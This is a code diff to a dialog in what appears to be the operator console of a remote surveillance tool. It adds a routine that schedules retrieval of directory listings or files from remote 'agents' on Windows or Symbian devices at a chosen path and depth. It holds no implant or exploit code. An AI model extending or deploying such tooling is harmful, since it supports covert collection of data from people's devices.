@@ -9,7 +9,10 @@
     <![CDATA[
       import it.ht.rcs.console.agent.controller.AgentManager;
       import it.ht.rcs.console.agent.model.Agent;
+      import it.ht.rcs.console.notifications.NotificationPopup;
       import it.ht.rcs.console.utils.AlertPopUp;
+      
+      import locale.R
       
       [Bindable]
       public var item:Object;
@@ -23,6 +26,36 @@
       {
         var path:String;
         numItemsToProcess=items.length;
+        for(var i:int=0;i<items.length;i++)
+        {
+          if (items[i].attr == FileSystemView.SUBROOT)//-1
+            path = '/';
+          else {
+           path=items[i].path
+          }
+          
+          var aid:String = items[i].aid;
+          items[i].pending=true;
+          AgentManager.instance.filesystem(aid, path, depthStepper.value, function(e:Event):void { 
+            numItemsToProcess--;
+            if(numItemsToProcess==0)
+            {
+             //AlertPopUp.show('Items scheduled for retrieval');
+              NotificationPopup.showNotification('Items scheduled for retrieval',2)
+              dispatchEvent(new Event("close"))
+              close();
+              
+            }
+          });
+          
+          
+        }
+      }
+      
+/*       private function save():void
+      {
+        var path:String;
+        numItemsToProcess=items.length;
        for(var i:int=0;i<items.length;i++)
          {
            if (items[i].attr == FileSystemView.SUBROOT)//-1
@@ -32,7 +65,7 @@
              //var separator:String = path.indexOf('/') == -1 ? '\\' : '/';
              var separator:String=""
              var agent:Agent=items[i].agent;
-             if(items[i].agent.platform=="windows" || items[i].agent.platform=="winmo" || items[i].agent.platform=="symbian")
+             if(items[i].agent.platform=="windows" || items[i].agent.platform=="symbian")
              {
                separator="\\";
              }
@@ -60,7 +93,7 @@
            
            
          }
-      }
+      } */
       
       private function buildPath():String
       {
